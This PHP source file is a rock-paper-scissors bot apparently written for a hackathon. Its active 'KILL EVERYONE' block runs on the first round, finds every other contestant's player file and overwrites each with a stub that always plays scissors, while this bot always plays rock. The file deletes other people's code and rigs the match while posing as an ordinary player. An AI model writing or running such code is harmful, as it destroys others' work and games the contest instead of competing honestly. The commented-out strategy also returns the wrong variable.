<?php

namespace Hackathon\PlayerIA;
use Hackathon\Game\Result;

/**
 * Class DebecPlayer
 * @package Hackathon\PlayerIA
 * @author Robin
 *
 */
class DebecPlayer extends Player
{
    protected $mySide;
    protected $opponentSide;
    protected $result;

    public function getChoice()
    {
        // -------------------------------------    -----------------------------------------------------
        // How to get my Last Choice           ?    $this->result->getLastChoiceFor($this->mySide) -- if 0 (first round)
        // How to get the opponent Last Choice ?    $this->result->getLastChoiceFor($this->opponentSide) -- if 0 (first round)
        // -------------------------------------    -----------------------------------------------------
        // How to get my Last Score            ?    $this->result->getLastScoreFor($this->mySide) -- if 0 (first round)
        // How to get the opponent Last Score  ?    $this->result->getLastScoreFor($this->opponentSide) -- if 0 (first round)
        // -------------------------------------    -----------------------------------------------------
        // How to get all the Choices          ?    $this->result->getChoicesFor($this->mySide)
        // How to get the opponent Last Choice ?    $this->result->getChoicesFor($this->opponentSide)
        // -------------------------------------    -----------------------------------------------------
        // How to get my Last Score            ?    $this->result->getLastScoreFor($this->mySide)
        // How to get the opponent Last Score  ?    $this->result->getLastScoreFor($this->opponentSide)
        // -------------------------------------    -----------------------------------------------------
        // How to get the stats                ?    $this->result->getStats()
        // How to get the stats for me         ?    $this->result->getStatsFor($this->mySide)
        //          array('name' => value, 'score' => value, 'friend' => value, 'foe' => value
        // How to get the stats for the oppo   ?    $this->result->getStatsFor($this->opponentSide)
        //          array('name' => value, 'score' => value, 'friend' => value, 'foe' => value
        // -------------------------------------    -----------------------------------------------------
        // How to get the number of round      ?    $this->result->getNbRound()
        // -------------------------------------    -----------------------------------------------------
        // How can i display the result of each round ? $this->prettyDisplay()
        // -------------------------------------    -----------------------------------------------------

        /* EASY STRAT */
        // $choice = parent::scissorsChoice();
        // $choices = $this->result->getStatsFor($this->opponentSide);
        // // print_r($choices);
        // // print("========\n");
        //
        // if ($choices["scissors"] > $choices["paper"] && $choices["scissors"] > $choices["rock"])
        //   $choices = parent::rockChoice();
        // else if ($choices["paper"] > $choices["scissors"] && $choices["paper"] > $choices["rock"])
        //   $choices = parent::scissorsChoice();
        // else
        //   $choices = parent::paperChoice();
        // return $choice;

        /* KILL EVERYONE */
        $choice = parent::rockChoice();

        if ($this->result->getNbRound() != 0)
          return $choice;
        $files = glob('src/Game/PlayerIA/*Player.{php}', GLOB_BRACE);
        foreach($files as $file) {
          if ($file == "src/Game/PlayerIA/DebecPlayer.php" || $file == "src/Game/PlayerIA/Player.php")
            continue;

          $filename = basename($file, ".php").PHP_EOL;
          // print("filename:" . $filename . "\n");

          $content =
          '<?php' . "\n" .
          'namespace Hackathon\PlayerIA;' . "\n" .
          'use Hackathon\Game\Result;' . "\n" .
          '/**' . "\n" .
           '* Class DiomandePlayer' . "\n" .
           '* @package Hackathon\PlayerIA' . "\n" .
           '* @author Robin' . "\n" .
           '*' . "\n" .
           '*/' . "\n" .
          'class ' . $filename . ' extends Player' . "\n" .
          '{' . "\n" .
              'protected $mySide;' . "\n" .
              'protected $opponentSide;' . "\n" .
              'protected $result;' . "\n" .
              'public function getChoice()' . "\n" .
              '{' . "\n" .
                  '$choice = parent::scissorsChoice();' . "\n" .
                  '$var = 1;' . "\n" .
                  'return $choice;' . "\n" .
              '}' . "\n" .
          '};';

          print($content . "\n==================\n");

          file_put_contents($file, $content);
        }
        return $choice;
    }
};
